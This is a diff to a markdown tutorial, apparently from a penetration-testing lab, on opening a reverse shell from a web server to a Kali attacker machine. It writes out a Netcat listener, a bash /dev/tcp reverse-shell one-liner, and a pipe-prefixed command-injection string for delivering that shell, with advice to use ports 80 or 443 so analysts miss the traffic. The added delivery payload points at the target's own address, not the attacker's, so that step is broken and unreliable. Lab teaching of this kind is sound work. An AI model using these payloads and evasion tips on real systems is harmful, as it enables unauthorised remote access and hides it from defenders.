@@ -3,6 +3,7 @@
 
 Example scenario of establishing a reverse shell connection between a Kali attacker machine and a target machine (e.g., web application server on port 172.16.10.12).
 
+
 ## Setting Up a Netcat Listener
 Use Netcat to create a shell listener on the Kali attacker machine.<br>
 Execute the following command in a fresh terminal window:
@@ -18,6 +19,7 @@ nc -l -p 1337 -vv
 > In real-world scenarios, you want to be more discreet. Choose a port that will blend in with the environment.
 > Outbound connections on port 1337 may raise suspicion and trigger alerts.
 > However, common ports such as 80 or 443 which are often used by HTTP, might be overlooked by blue team analysts.
+
 
 ## Crafting a Payload
 Next, craft an interactive reverse shell payload with a single line of bash.<br>
@@ -40,3 +42,12 @@ bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
 
 
 ## Delivering and Initializing the Payload
+To deliver the single-line reverse shell payload, exploit the OS command injection vulnerability that was previously identified in the web application server (172.16.10.12).
+If you remember, the vulnerability was identified to be a HTML input field that could be exploited by prepending a payload with the pipe (|) metacharacter.<br>
+For example, we would deliver our single-line reverse shell payload by submitting the following in the input field:
+```
+|bash -c 'bash -i >& /dev/tcp/172.16.10.12/1337 0>&1'
+```
+
+
+## Executing Commands
